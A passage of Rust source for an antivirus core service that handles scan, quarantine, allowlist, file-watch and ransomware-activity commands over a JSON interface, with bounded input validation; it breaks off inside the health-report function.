use std::collections::HashMap;
use std::ffi::OsString;
use std::io::{self, BufRead, Read, Write};
use std::path::{Path, PathBuf};
use std::sync::mpsc;
use std::thread;
use std::time::{Duration, Instant, SystemTime, UNIX_EPOCH};

use anyhow::{Context, Result};
use chrono::{DateTime, Utc};
use serde::{Deserialize, Serialize};
use serde_json::json;
use sha2::{Digest, Sha256};
use zentor_native_engine::{
    Confidence as AneConfidence, EngineConfig, EngineStatus as AneEngineStatus,
    ScanActionMode as AneScanActionMode, SelfTestReport as AneSelfTestReport,
    ThreatCategory as AneThreatCategory, Verdict as AneVerdict, ZentorNativeEngine,
};

#[cfg_attr(not(test), allow(dead_code, unused_imports))]
mod ai;
#[cfg_attr(not(test), allow(dead_code))]
mod allowlist;
mod api;
#[cfg_attr(not(test), allow(dead_code, unused_imports))]
mod app_control;
mod migration;
#[cfg_attr(not(test), allow(dead_code))]
mod protection;
#[cfg_attr(not(test), allow(dead_code))]
mod quarantine;
#[cfg_attr(not(test), allow(dead_code, unused_imports))]
mod scanner;
#[cfg_attr(not(test), allow(dead_code))]
mod watcher;
mod windows_tools;

use allowlist::{AllowlistEntryType, AllowlistStore};
use api::{CoreCommand, CoreResponse};
use quarantine::QuarantineStore;
use scanner::{
    file_walker::{collect_accessible_files, collect_accessible_files_with_options, WalkOptions},
    DetectionType, RecommendedAction, ReportStatus, ReputationProvider, RiskEngine, RiskReason,
    RiskReasonSource, RiskScore, RiskSeverity, RiskVerdict, ScanActionMode, ScanJob, ScanJobStatus,
    ScanKind, ScanProgress, ScanStatus, ThreatCategory, ThreatConfidence, ThreatResult,
    ThreatResultStatus,
};
use uuid::Uuid;
use watcher::{
    collect_watch_candidates, UserModeFileMonitor, WatchEvaluation, WatchEvent, WatcherState,
};

const FULL_SCAN_MAX_SECONDS: u64 = 3 * 60 * 60;
const MAX_LOCAL_CORE_HASH_BYTES: u64 = 1024 * 1024 * 1024;
const MAX_SCAN_ERROR_DETAILS: usize = 20;
const MAX_SCAN_ERROR_DETAIL_CHARS: usize = 4096;
const SCAN_ERROR_TRUNCATION_SUFFIX: &str = "...[truncated]";
const MAX_RANSOMWARE_GUARD_CONFIG_BYTES: u64 = 64 * 1024;
const MAX_CORE_COMMAND_JSON_BYTES: usize = 256 * 1024;
const MAX_CORE_IPC_PATHS: usize = 64;
const MAX_CORE_IPC_PATH_CHARS: usize = 4096;
const MAX_CORE_IPC_ID_CHARS: usize = 128;
const MAX_CORE_IPC_MODE_CHARS: usize = 64;
const MAX_CORE_IPC_LABEL_CHARS: usize = 128;
const MAX_CORE_IPC_ENGINE_CHARS: usize = 128;
const MAX_CORE_IPC_THREAT_NAME_CHARS: usize = 256;
const MAX_CORE_IPC_NOTE_CHARS: usize = 4096;
const MAX_RANSOMWARE_ACTIVITY_RENAMED_COUNT: u32 = 100_000;
const MAX_RANSOMWARE_ACTIVITY_TIME_WINDOW_SECONDS: u32 = 3_600;
const WATCH_POLL_DEFAULT_DURATION_MS: u64 = 2_000;
const WATCH_POLL_MIN_DURATION_MS: u64 = 250;
const WATCH_POLL_MAX_DURATION_MS: u64 = 10_000;
const WATCH_POLL_DEFAULT_INTERVAL_MS: u64 = 200;
const WATCH_POLL_MIN_INTERVAL_MS: u64 = 50;
const WATCH_POLL_MAX_INTERVAL_MS: u64 = 2_000;
const WATCH_POLL_DEFAULT_MAX_EVENTS: usize = 8;
const WATCH_POLL_MAX_EVENTS_LIMIT: usize = 32;
const WATCH_POLL_MAX_FILES_PER_PASS: usize = 512;
const WATCH_POLL_MAX_DEPTH: usize = 8;
const WATCH_POLL_DEBOUNCE_MS: u64 = 200;
const SERVICE_NAME: &str = "avorax_core_service";
const WINDOWS_ERROR_VIRUS_INFECTED: i32 = 225;
const WINDOWS_ERROR_VIRUS_DELETED: i32 = 226;

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
struct WatchFileFingerprint {
    size_bytes: u64,
    modified_at_ms: u64,
}

#[derive(Debug, Serialize)]
#[serde(rename_all = "camelCase")]
struct WatchPollScanEvent {
    path: String,
    reason: String,
    scan_status: ReportStatus,
    threats_found: u64,
    quarantined_files: u64,
}

#[derive(Debug, Serialize)]
#[serde(rename_all = "camelCase")]
struct WatchPollScanSummary {
    active: bool,
    mode: &'static str,
    duration_ms: u64,
    poll_interval_ms: u64,
    max_events: usize,
    initial_files_observed: usize,
    polls_completed: u64,
    events_observed: usize,
    files_scanned: u64,
    threats_found: u64,
    quarantined_files: u64,
    scan_errors: Vec<String>,
    limitations: Vec<&'static str>,
    events: Vec<WatchPollScanEvent>,
}

fn main() -> Result<()> {
    let mut args = std::env::args().skip(1);
    if let Some(arg) = args.next() {
        if arg == "--service" {
            return run_service();
        }
    }
    let migration_report =
        migration::migrate_from_legacy_brand().context("legacy data migration failed")?;
    let migration_event_dir =
        migration::zentor_data_dir().context("failed to resolve migration event log directory")?;
    migration::write_migration_event_log(&migration_event_dir, &migration_report)
        .context("failed to write migration event log")?;
    let stdin = io::stdin();
    let mut stdin = stdin.lock();
    while let Some(line) = read_next_core_command_line(&mut stdin)? {
        if line.trim().is_empty() {
            continue;
        }
        let command = parse_core_command_line(&line)?;
        let response = handle(command);
        println!("{}", serde_json::to_string(&response)?);
    }
    Ok(())
}

fn read_next_core_command_line<R: BufRead>(reader: &mut R) -> Result<Option<String>> {
    read_next_bounded_line(reader, MAX_CORE_COMMAND_JSON_BYTES, "core command JSON")
}

fn read_next_bounded_line<R: BufRead>(
    reader: &mut R,
    max_bytes: usize,
    label: &str,
) -> Result<Option<String>> {
    let mut raw = Vec::new();
    loop {
        let available = reader.fill_buf()?;
        if available.is_empty() {
            if raw.is_empty() {
                return Ok(None);
            }
            break;
        }
        let newline = available.iter().position(|byte| *byte == b'\n');
        let take = bytes_to_consume_for_line_chunk(available, newline);
        if raw.len().saturating_add(take) > max_bytes {
            anyhow::bail!("{label} exceeds maximum size of {max_bytes} bytes");
        }
        raw.extend_from_slice(&available[..take]);
        reader.consume(take);
        if newline.is_some() {
            break;
        }
    }
    while matches!(raw.last(), Some(b'\n' | b'\r')) {
        raw.pop();
    }
    String::from_utf8(raw)
        .map(Some)
        .with_context(|| format!("{label} is not valid UTF-8"))
}

fn bytes_to_consume_for_line_chunk(available: &[u8], newline: Option<usize>) -> usize {
    match newline {
        Some(index) => index + 1,
        None => available.len(),
    }
}

fn parse_core_command_line(line: &str) -> Result<CoreCommand> {
    if line.len() > MAX_CORE_COMMAND_JSON_BYTES {
        anyhow::bail!(
            "core command JSON exceeds maximum size of {} bytes",
            MAX_CORE_COMMAND_JSON_BYTES
        );
    }
    serde_json::from_str(line).context("failed to parse core command JSON")
}

#[cfg(windows)]
windows_service::define_windows_service!(ffi_service_main, windows_service_main);

#[cfg(windows)]
fn run_service() -> Result<()> {
    windows_service::service_dispatcher::start(SERVICE_NAME, ffi_service_main)?;
    Ok(())
}

#[cfg(not(windows))]
fn run_service() -> Result<()> {
    anyhow::bail!("Avorax Core Service Windows service mode is unsupported on this platform")
}

#[cfg(windows)]
fn windows_service_main(_arguments: Vec<OsString>) {
    if let Err(error) = run_windows_service_loop() {
        report_core_fatal_error("core_service_error.log", &format!("{error:#}"));
    }
}

fn report_core_fatal_error(file_name: &str, detail: &str) {
    if let Err(error) = write_core_fatal_error_log(file_name, detail) {
        eprintln!(
            "failed to write core fatal error log {file_name}: {error:#}; original error: {detail}"
        );
    }
}

fn write_core_fatal_error_log(file_name: &str, detail: &str) -> Result<()> {
    if file_name.is_empty() || file_name.contains('/') || file_name.contains('\\') {
        anyhow::bail!("invalid core fatal error log file name");
    }
    let base = avorax_program_data_dir()?.join("logs");
    std::fs::create_dir_all(&base).with_context(|| {
        format!(
            "failed to create core fatal log directory {}",
            base.display()
        )
    })?;
    ensure_runtime_directory(&base, "core fatal log directory")?;
    let path = base.join(file_name);
    let temp_path = path.with_extension(format!("tmp-{}", Uuid::new_v4()));
    write_runtime_file_exclusive(
        &temp_path,
        detail.as_bytes(),
        "temporary core fatal error log",
    )?;
    if let Err(error) = remove_existing_runtime_file(&path, "core fatal error log") {
        cleanup_staged_local_core_file(&temp_path, "temporary core fatal error log")
            .with_context(|| {
                format!(
                    "failed to clean up temporary core fatal error log {} after activation preflight failed: {error:#}",
                    temp_path.display()
                )
            })?;
        return Err(error);
    }
    if let Err(error) = std::fs::rename(&temp_path, &path) {
        cleanup_staged_local_core_file(&temp_path, "temporary core fatal error log")
            .with_context(|| {
                format!(
                    "failed to clean up temporary core fatal error log {} after activation failed: {error:#}",
                    temp_path.display()
                )
            })?;
        return Err(error).with_context(|| {
            format!("failed to activate core fatal error log {}", path.display())
        });
    }
    Ok(())
}

#[cfg(windows)]
fn run_windows_service_loop() -> Result<()> {
    use windows_service::service::{
        ServiceControl, ServiceControlAccept, ServiceExitCode, ServiceState, ServiceStatus,
        ServiceType,
    };
    use windows_service::service_control_handler::{self, ServiceControlHandlerResult};

    let (shutdown_tx, shutdown_rx) = mpsc::channel();
    let status_handle =
        service_control_handler::register(
            SERVICE_NAME,
            move |control_event| match control_event {
                ServiceControl::Stop | ServiceControl::Shutdown => {
                    if let Err(error) = shutdown_tx.send(()) {
                        report_core_fatal_error(
                            "core_service_error.log",
                            &format!("failed to signal core service shutdown: {error}"),
                        );
                    }
                    ServiceControlHandlerResult::NoError
                }
                ServiceControl::Interrogate => ServiceControlHandlerResult::NoError,
                _ => ServiceControlHandlerResult::NotImplemented,
            },
        )?;

    native_engine().context("native engine warmup failed")?;

    status_handle.set_service_status(ServiceStatus {
        service_type: ServiceType::OWN_PROCESS,
        current_state: ServiceState::Running,
        controls_accepted: ServiceControlAccept::STOP | ServiceControlAccept::SHUTDOWN,
        exit_code: ServiceExitCode::Win32(0),
        checkpoint: 0,
        wait_hint: Duration::from_secs(0),
        process_id: None,
    })?;

    shutdown_rx
        .recv()
        .context("core service shutdown channel closed before stop signal")?;

    status_handle.set_service_status(ServiceStatus {
        service_type: ServiceType::OWN_PROCESS,
        current_state: ServiceState::Stopped,
        controls_accepted: ServiceControlAccept::empty(),
        exit_code: ServiceExitCode::Win32(0),
        checkpoint: 0,
        wait_hint: Duration::from_secs(0),
        process_id: None,
    })?;
    Ok(())
}

fn handle(command: CoreCommand) -> serde_json::Value {
    match command.command.as_str() {
        "health" => health_response(),
        "cancel_scan" => match request_scan_cancellation() {
            Ok(path) => json!({"ok": true, "cancel_token": path.display().to_string()}),
            Err(error) => json!({"ok": false, "error": error.to_string()}),
        },
        "scan_file" => {
            let path = match required_core_ipc_path(command.path, "path") {
                Ok(path) => path,
                Err(error) => return json!({"ok": false, "error": error.to_string()}),
            };
            let action_mode = match parse_bounded_action_mode(command.action_mode) {
                Ok(mode) => mode,
                Err(error) => return json!({"ok": false, "error": error.to_string()}),
            };
            let kind = match parse_bounded_scan_kind(command.scan_kind) {
                Ok(kind) => kind,
                Err(error) => return json!({"ok": false, "error": error.to_string()}),
            };
            match scan_paths(vec![path], action_mode, kind, None) {
                Ok(report) => json!(report),
                Err(error) => json!({"ok": false, "error": error.to_string()}),
            }
        }
        "scan_folder" => {
            let path = match required_core_ipc_path(command.path, "path") {
                Ok(path) => path,
                Err(error) => return json!({"ok": false, "error": error.to_string()}),
            };
            let action_mode = match parse_bounded_action_mode(command.action_mode) {
                Ok(mode) => mode,
                Err(error) => return json!({"ok": false, "error": error.to_string()}),
            };
            let kind = match parse_bounded_scan_kind(command.scan_kind) {
                Ok(kind) => kind,
                Err(error) => return json!({"ok": false, "error": error.to_string()}),
            };
            match scan_paths(vec![path], action_mode, kind, None) {
                Ok(report) => json!(report),
                Err(error) => json!({"ok": false, "error": error.to_string()}),
            }
        }
        "quick_scan_selected_paths" | "full_scan" => {
            let paths = match optional_core_ipc_paths(command.paths, "paths") {
                Ok(paths) => paths,
                Err(error) => return json!({"ok": false, "error": error.to_string()}),
            };
            let action_mode = match parse_bounded_action_mode(command.action_mode) {
                Ok(mode) => mode,
                Err(error) => return json!({"ok": false, "error": error.to_string()}),
            };
            let kind = match parse_bounded_scan_kind(command.scan_kind) {
                Ok(kind) => kind,
                Err(error) => return json!({"ok": false, "error": error.to_string()}),
            };
            let mut emit = |progress: &ScanProgress| {
                println!("{}", progress_event_line(progress));
            };
            match scan_paths(paths, action_mode, kind, Some(&mut emit)) {
                Ok(report) => json!(report),
                Err(error) => json!({"ok": false, "error": error.to_string()}),
            }
        }
        "list_quarantine" => match QuarantineStore::new().and_then(|store| store.list()) {
            Ok(records) => json!({"ok": true, "records": records}),
            Err(error) => json!({"ok": false, "error": error.to_string(), "records": []}),
        },
        "add_allowlist_entry" => {
            let path = match required_core_ipc_path(command.path, "path") {
                Ok(path) => path,
                Err(error) => return json!({"ok": false, "error": error.to_string()}),
            };
            match AllowlistStore::new().and_then(|mut store| {
                store.add(
                    AllowlistEntryType::File,
                    path.display().to_string(),
                    "Added by local user".to_string(),
                )
            }) {
                Ok(entry) => json!({"ok": true, "entry": entry}),
                Err(error) => json!({"ok": false, "error": error.to_string()}),
            }
        }
        "list_allowlist" => match AllowlistStore::new() {
            Ok(store) => json!({"ok": true, "entries": store.list()}),
            Err(error) => json!({"ok": false, "error": error.to_string(), "entries": []}),
        },
        "start_watch" => {
            let requested_paths = match optional_core_ipc_paths(command.paths, "paths") {
                Ok(paths) => paths,
                Err(error) => return json!({"ok": false, "error": error.to_string()}),
            };
            json!({"ok": true, "watcher": WatcherState::from_requested_paths(requested_paths)})
        }
        "watch_poll_scan" => {
            let requested_paths = match optional_core_ipc_paths(command.paths, "paths") {
                Ok(paths) => paths,
                Err(error) => return json!({"ok": false, "error": error.to_string()}),
            };
            let action_mode = match parse_bounded_action_mode(command.action_mode) {
                Ok(mode) => mode,
                Err(error) => return json!({"ok": false, "error": error.to_string()}),
            };
            let kind = match parse_bounded_scan_kind(command.scan_kind) {
                Ok(kind) => kind,
                Err(error) => return json!({"ok": false, "error": error.to_string()}),
            };
            let duration_ms = match parse_core_ipc_u64_bound(
                command.duration_ms,
                "duration_ms",
                WATCH_POLL_DEFAULT_DURATION_MS,
                WATCH_POLL_MIN_DURATION_MS,
                WATCH_POLL_MAX_DURATION_MS,
            ) {
                Ok(value) => value,
                Err(error) => return json!({"ok": false, "error": error.to_string()}),
            };
            let poll_interval_ms = match parse_core_ipc_u64_bound(
                command.poll_interval_ms,
                "poll_interval_ms",
                WATCH_POLL_DEFAULT_INTERVAL_MS,
                WATCH_POLL_MIN_INTERVAL_MS,
                WATCH_POLL_MAX_INTERVAL_MS,
            ) {
                Ok(value) => value,
                Err(error) => return json!({"ok": false, "error": error.to_string()}),
            };
            let max_events = match parse_core_ipc_u64_bound(
                command.max_events,
                "max_events",
                WATCH_POLL_DEFAULT_MAX_EVENTS as u64,
                1,
                WATCH_POLL_MAX_EVENTS_LIMIT as u64,
            ) {
                Ok(value) => value as usize,
                Err(error) => return json!({"ok": false, "error": error.to_string()}),
            };
            match run_watch_poll_scan(
                requested_paths,
                action_mode,
                kind,
                duration_ms,
                poll_interval_ms,
                max_events,
            ) {
                Ok((watcher, poll)) => json!({"ok": true, "watcher": watcher, "poll": poll}),
                Err(error) => json!({"ok": false, "error": error.to_string()}),
            }
        }
        "stop_watch" => json!({"ok": true, "watcher": WatcherState::stopped()}),
        "quarantine_file" => {
            let path = match required_core_ipc_path(command.path, "path") {
                Ok(path) => path,
                Err(error) => return json!({"ok": false, "error": error.to_string()}),
            };
            let threat_name = match optional_core_ipc_text(
                command.threat_name,
                "threat_name",
                MAX_CORE_IPC_THREAT_NAME_CHARS,
            ) {
                Ok(Some(value)) => value,
                Ok(None) => "Possible malware".to_string(),
                Err(error) => return json!({"ok": false, "error": error.to_string()}),
            };
            let engine =
                match optional_core_ipc_text(command.engine, "engine", MAX_CORE_IPC_ENGINE_CHARS) {
                    Ok(Some(value)) => value,
                    Ok(None) => "zentor-manual-review".to_string(),
                    Err(error) => return json!({"ok": false, "error": error.to_string()}),
                };
            match quarantine_selected_file(&path, &threat_name, &engine) {
                Ok(record) => json!({"ok": true, "record": record}),
                Err(error) => json!({"ok": false, "error": error.to_string()}),
            }
        }
        "restore_quarantine_item" => {
            let id = match required_core_ipc_text(
                command.quarantine_id,
                "quarantine_id",
                MAX_CORE_IPC_ID_CHARS,
            ) {
                Ok(id) => id,
                Err(error) => return json!({"ok": false, "error": error.to_string()}),
            };
            if let Err(error) = require_explicit_confirmation(command.confirmed, "restore") {
                return json!({"ok": false, "error": error.to_string()});
            }
            match QuarantineStore::new().and_then(|store| store.restore(&id, true)) {
                Ok(record) => json!({"ok": true, "record": record}),
                Err(error) => json!({"ok": false, "error": error.to_string()}),
            }
        }
        "delete_quarantine_item" => {
            let id = match required_core_ipc_text(
                command.quarantine_id,
                "quarantine_id",
                MAX_CORE_IPC_ID_CHARS,
            ) {
                Ok(id) => id,
                Err(error) => return json!({"ok": false, "error": error.to_string()}),
            };
            if let Err(error) = require_explicit_confirmation(command.confirmed, "delete") {
                return json!({"ok": false, "error": error.to_string()});
            }
            match QuarantineStore::new().and_then(|store| store.delete(&id, true)) {
                Ok(record) => json!({"ok": true, "record": record}),
                Err(error) => json!({"ok": false, "error": error.to_string()}),
            }
        }
        "label_detection" => {
            let path = match required_core_ipc_path(command.path, "path") {
                Ok(path) => path,
                Err(error) => return json!({"ok": false, "error": error.to_string()}),
            };
            let raw_label = match required_core_ipc_text(
                command.user_label,
                "user_label",
                MAX_CORE_IPC_LABEL_CHARS,
            ) {
                Ok(label) => label,
                Err(error) => return json!({"ok": false, "error": error.to_string()}),
            };
            let user_note = match optional_core_ipc_text(
                command.user_note,
                "user_note",
                MAX_CORE_IPC_NOTE_CHARS,
            ) {
                Ok(note) => note,
                Err(error) => return json!({"ok": false, "error": error.to_string()}),
            };
            let previous_verdict = match optional_core_ipc_text(
                command.previous_verdict,
                "previous_verdict",
                MAX_CORE_IPC_LABEL_CHARS,
            ) {
                Ok(Some(verdict)) => verdict,
                Ok(None) => "unknown".to_string(),
                Err(error) => return json!({"ok": false, "error": error.to_string()}),
            };
            match save_training_label(&path, &raw_label, user_note, previous_verdict) {
                Ok(label_path) => json!({"ok": true, "path": label_path}),
                Err(error) => json!({"ok": false, "error": error.to_string()}),
            }
        }
        "configure_guard_mode" => {
            let mode = match required_core_ipc_text(
                command.protection_mode,
                "protection_mode",
                MAX_CORE_IPC_MODE_CHARS,
            ) {
                Ok(mode) => mode,
                Err(error) => return json!({"ok": false, "error": error.to_string()}),
            };
            match write_guard_mode_config(&mode) {
                Ok(path) => json!({"ok": true, "guard_mode_config_path": path}),
                Err(error) => json!({"ok": false, "error": error.to_string()}),
            }
        }
        "configure_ransomware_guard" => {
            let protected_roots = match optional_core_ipc_non_empty_path_texts(
                command.protected_roots,
                "protected_roots",
            ) {
                Ok(paths) => paths,
                Err(error) => return json!({"ok": false, "error": format!("{error:#}")}),
            };
            let trusted_process_allowlist = match optional_core_ipc_non_empty_path_texts(
                command.trusted_process_allowlist,
                "trusted_process_allowlist",
            ) {
                Ok(paths) => paths,
                Err(error) => return json!({"ok": false, "error": format!("{error:#}")}),
            };
            match write_ransomware_guard_config(protected_roots, trusted_process_allowlist) {
                Ok(path) => json!({"ok": true, "ransomware_guard_config_path": path}),
                Err(error) => json!({"ok": false, "error": format!("{error:#}")}),
            }
        }
        "list_ransomware_guard_config" => match read_ransomware_guard_config() {
            Ok(config) => json!({"ok": true, "config": config}),
            Err(error) => json!({"ok": false, "error": format!("{error:#}")}),
        },
        "evaluate_ransomware_activity" => {
            match evaluate_ransomware_activity(command.ransomware_activity) {
                Ok(response) => response,
                Err(error) => json!({"ok": false, "error": format!("{error:#}")}),
            }
        }
        "evaluate_process_snapshot" => {
            let observations = match command.process_observations {
                Some(observations) => observations,
                None => {
                    return json!({
                        "ok": false,
                        "error": "process_observations is required for evaluate_process_snapshot"
                    });
                }
            };
            let policy = command.process_monitor_policy.unwrap_or_default();
            json!(
                protection::process_monitor::ProcessMonitor::evaluate_snapshot(
                    &observations,
                    &policy
                )
            )
        }
        "remove_allowlist_entry" => {
            let id = match required_core_ipc_text(
                command.allowlist_id,
                "allowlist_id",
                MAX_CORE_IPC_ID_CHARS,
            ) {
                Ok(id) => id,
                Err(error) => return json!({"ok": false, "error": error.to_string()}),
            };
            if let Err(error) =
                require_explicit_confirmation(command.confirmed, "allowlist removal")
            {
                return json!({"ok": false, "error": error.to_string()});
            }
            match AllowlistStore::new().and_then(|mut store| store.deactivate(&id)) {
                Ok(entry) => json!({"ok": true, "entry": entry}),
                Err(error) => json!({"ok": false, "error": error.to_string()}),
            }
        }
        _ => json!({"ok": false, "error": "unknown command"}),
    }
}

fn require_explicit_confirmation(confirmed: Option<bool>, action: &str) -> anyhow::Result<()> {
    if confirmed == Some(true) {
        Ok(())
    } else {
        anyhow::bail!("{action} requires explicit confirmation");
    }
}

fn evaluate_ransomware_activity(
    request: Option<api::RansomwareActivityRequest>,
) -> anyhow::Result<serde_json::Value> {
    let request = request.ok_or_else(|| {
        anyhow::anyhow!("ransomware_activity is required for evaluate_ransomware_activity")
    })?;
    validate_core_ipc_path_text(&request.process_path, "ransomware_activity.process_path")?;
    if request.modified_paths.len() > MAX_CORE_IPC_PATHS {
        anyhow::bail!(
            "ransomware_activity.modified_paths exceeds maximum entry count of {}",
            MAX_CORE_IPC_PATHS
        );
    }
    let mut modified_paths = Vec::with_capacity(request.modified_paths.len());
    for (index, raw_path) in request.modified_paths.into_iter().enumerate() {
        validate_core_ipc_path_text(
            &raw_path,
            &format!("ransomware_activity.modified_paths[{index}]"),
        )?;
        modified_paths.push(PathBuf::from(raw_path));
    }
    validate_ransomware_score(
        request.entropy_change_score,
        "ransomware_activity.entropy_change_score",
    )?;
    validate_ransomware_score(
        request.ransom_note_score,
        "ransomware_activity.ransom_note_score",
    )?;
    validate_ransomware_score(
        request.backup_tamper_score,
        "ransomware_activity.backup_tamper_score",
    )?;
    if request.files_renamed_count > MAX_RANSOMWARE_ACTIVITY_RENAMED_COUNT {
        anyhow::bail!(
            "ransomware_activity.files_renamed_count exceeds maximum value of {}",
            MAX_RANSOMWARE_ACTIVITY_RENAMED_COUNT
        );
    }
    if request.time_window_seconds == 0
        || request.time_window_seconds > MAX_RANSOMWARE_ACTIVITY_TIME_WINDOW_SECONDS
    {
        anyhow::bail!(
            "ransomware_activity.time_window_seconds must be between 1 and {}",
            MAX_RANSOMWARE_ACTIVITY_TIME_WINDOW_SECONDS
        );
    }

    let persisted_config = read_ransomware_guard_config()?;
    let runtime_config = protection::ransomware_guard::RansomwareGuardConfig {
        protected_roots: persisted_config
            .protected_roots
            .iter()
            .map(PathBuf::from)
            .collect(),
        trusted_process_allowlist: persisted_config
            .trusted_process_allowlist
            .iter()
            .map(PathBuf::from)
            .collect(),
    };
    let signal = protection::ransomware_guard::RansomwareGuard::evaluate_with_config(
        request.process_id,
        request.process_path,
        &modified_paths,
        request.files_renamed_count,
        request.entropy_change_score,
        request.ransom_note_score,
        request.backup_tamper_score,
        request.time_window_seconds,
        &runtime_config,
    );
    Ok(json!({
        "ok": true,
        "detected": signal.is_some(),
        "signal": signal,
        "config_source": persisted_config.source,
        "limitations": [
            "caller-supplied-activity-observations-only",
            "post-write-detection-only",
            "no-persistent-service-monitor",
            "no-kernel-pre-execution-blocking"
        ]
    }))
}

fn validate_ransomware_score(value: f32, field: &str) -> anyhow::Result<()> {
    if !value.is_finite() {
        anyhow::bail!("{field} must be finite");
    }
    if !(0.0..=1.0).contains(&value) {
        anyhow::bail!("{field} must be between 0 and 1");
    }
    Ok(())
}

fn progress_event_line(progress: &ScanProgress) -> String {
    match serialize_progress_event_line(progress) {
        Ok(line) => line,
        Err(error) => progress_serialization_error_line(error),
    }
}

fn serialize_progress_event_line(progress: &ScanProgress) -> Result<String, serde_json::Error> {
    serde_json::to_string(&json!({"type": "progress", "progress": progress}))
}

fn progress_serialization_error_line(error: serde_json::Error) -> String {
    match serde_json::to_string(&json!({
        "type": "error",
        "ok": false,
        "error": format!("progress serialization failed: {error}")
    })) {
        Ok(line) => line,
        Err(_) => static_progress_serialization_error_line(),
    }
}

fn static_progress_serialization_error_line() -> String {
    "{\"type\":\"error\",\"ok\":false,\"error\":\"progress serialization failed\"}".to_string()
}

fn required_core_ipc_path(raw: Option<String>, field: &str) -> anyhow::Result<PathBuf> {
    let Some(raw) = raw else {
        anyhow::bail!("{field} is required");
    };
    validate_core_ipc_path_text(&raw, field)?;
    Ok(PathBuf::from(raw))
}

fn optional_core_ipc_paths(
    raw_paths: Option<Vec<String>>,
    field: &str,
) -> anyhow::Result<Vec<PathBuf>> {
    Ok(optional_core_ipc_path_texts(raw_paths, field)?
        .into_iter()
        .map(PathBuf::from)
        .collect())
}

fn optional_core_ipc_path_texts(
    raw_paths: Option<Vec<String>>,
    field: &str,
) -> anyhow::Result<Vec<String>> {
    let Some(raw_paths) = raw_paths else {
        return Ok(Vec::new());
    };
    if raw_paths.len() > MAX_CORE_IPC_PATHS {
        anyhow::bail!(
            "{field} exceeds maximum entry count of {}",
            MAX_CORE_IPC_PATHS
        );
    }
    raw_paths
        .into_iter()
        .enumerate()
        .map(|(index, raw)| {
            validate_core_ipc_path_text(&raw, &format!("{field}[{index}]"))?;
            Ok(raw)
        })
        .collect()
}

fn optional_core_ipc_non_empty_path_texts(
    raw_paths: Option<Vec<String>>,
    field: &str,
) -> anyhow::Result<Vec<String>> {
    let Some(raw_paths) = raw_paths else {
        return Ok(Vec::new());
    };
    if raw_paths.len() > MAX_CORE_IPC_PATHS {
        anyhow::bail!(
            "{field} exceeds maximum entry count of {}",
            MAX_CORE_IPC_PATHS
        );
    }
    let mut paths = Vec::new();
    for (index, raw) in raw_paths.into_iter().enumerate() {
        if raw.trim().is_empty() {
            continue;
        }
        validate_core_ipc_path_text(&raw, &format!("{field}[{index}]"))?;
        paths.push(raw);
    }
    Ok(paths)
}

fn validate_core_ipc_path_text(raw: &str, field: &str) -> anyhow::Result<()> {
    if raw.trim().is_empty() {
        anyhow::bail!("{field} is empty");
    }
    if raw.chars().count() > MAX_CORE_IPC_PATH_CHARS {
        anyhow::bail!(
            "{field} exceeds maximum length of {} characters",
            MAX_CORE_IPC_PATH_CHARS
        );
    }
    if raw.contains('\0') {
        anyhow::bail!("{field} contains a NUL byte");
    }
    Ok(())
}

fn required_core_ipc_text(
    raw: Option<String>,
    field: &str,
    max_chars: usize,
) -> anyhow::Result<String> {
    let raw = raw.ok_or_else(|| anyhow::anyhow!("{field} is required"))?;
    validate_core_ipc_text(&raw, field, max_chars, true)?;
    Ok(raw.trim().to_string())
}

fn optional_core_ipc_text(
    raw: Option<String>,
    field: &str,
    max_chars: usize,
) -> anyhow::Result<Option<String>> {
    let Some(raw) = raw else {
        return Ok(None);
    };
    validate_core_ipc_text(&raw, field, max_chars, false)?;
    let trimmed = raw.trim();
    if trimmed.is_empty() {
        Ok(None)
    } else {
        Ok(Some(trimmed.to_string()))
    }
}

fn validate_core_ipc_text(
    raw: &str,
    field: &str,
    max_chars: usize,
    require_non_empty: bool,
) -> anyhow::Result<()> {
    if require_non_empty && raw.trim().is_empty() {
        anyhow::bail!("{field} is required");
    }
    if raw.chars().count() > max_chars {
        anyhow::bail!("{field} exceeds maximum length of {max_chars} characters");
    }
    if raw.contains('\0') {
        anyhow::bail!("{field} contains a NUL byte");
    }
    Ok(())
}

fn parse_bounded_action_mode(raw: Option<String>) -> anyhow::Result<ScanActionMode> {
    let raw = optional_core_ipc_text(raw, "action_mode", MAX_CORE_IPC_MODE_CHARS)?;
    Ok(parse_action_mode(raw.as_deref()))
}

fn parse_bounded_scan_kind(raw: Option<String>) -> anyhow::Result<ScanKind> {
    let raw = optional_core_ipc_text(raw, "scan_kind", MAX_CORE_IPC_MODE_CHARS)?;
    Ok(parse_scan_kind(raw.as_deref()))
}

fn parse_core_ipc_u64_bound(
    raw: Option<u64>,
    field: &str,
    default: u64,
    min: u64,
    max: u64,
) -> anyhow::Result<u64> {
    let value = raw.unwrap_or(default);
    if value < min || value > max {
        anyhow::bail!("{field} must be between {min} and {max}");
    }
    Ok(value)
}

fn health_response() -> serde_json::Value {
    let ai_self_test_result = ai::ai_self_test::run_ai_self_test();
    let ai_self_test_ok = ai_self_test_result.is_ok();
    let ai_self_test_error = ai_self_test_result
        .as_ref()
        .err()
        .map(|error| format!("{error:#}"));
    let program_data_dir = avorax_program_data_dir_report();
    let core_service_status = core_service_system_status_report();
    let guard_status = protection::GuardService::system_status_report();

    let locator = match EngineAssetLocator::discover() {
        Ok(locator) => locator,
        Err(error) => {
            return native_engine_unavailable_health_response(
                format!("{error:#}"),
                ai_self_test_ok,
                ai_self_test_error,
                program_data_dir,
                core_service_status,
                guard_status,
                None,
            );
        }
    };
    let asset_root = locator.asset_root.clone();
    let engine_dir = locator.installed_engine_dir.clone();
    match EngineConfig::from_repo_root(asset_root.clone()).and_then(ZentorNativeEngine::initialize)
    {
        Ok(mut engine) => {
            let status = engine.status();
            let native_self_test_result = engine.engine_self_test();
            let (native_self_test_ok, native_self_test_error) =
                native_self_test_status_and_error(native_self_test_result.as_ref());
            json!(CoreResponse {
                ok: true,
                body: json!({
                    "engine_status": if status.native_engine_ready { "available" } else { "error" },
                    "native_engine_status": if status.native_engine_ready { "ready" } else { "error" },
                    "native_signature_count": status.signature_count,
                    "native_rule_count": status.rule_count,
                    "native_ml_status": native_ml_status_label(&status),
                    "native_ml_model_version": status.ml_model_version,
                    "native_ml_production_ready": status.ml_model_production_ready,
                    "native_self_test": native_self_test_ok,
                    "native_self_test_error": native_self_test_error,
                    "compatibility_engines_enabled": false,
                    "yara_status": "compatDisabled",
                    "yara_rule_count": 0,
                    "ai_status": ai::ModelRunner::default().status(),
                    "ai_model": ai::ModelRunner::default().info(),
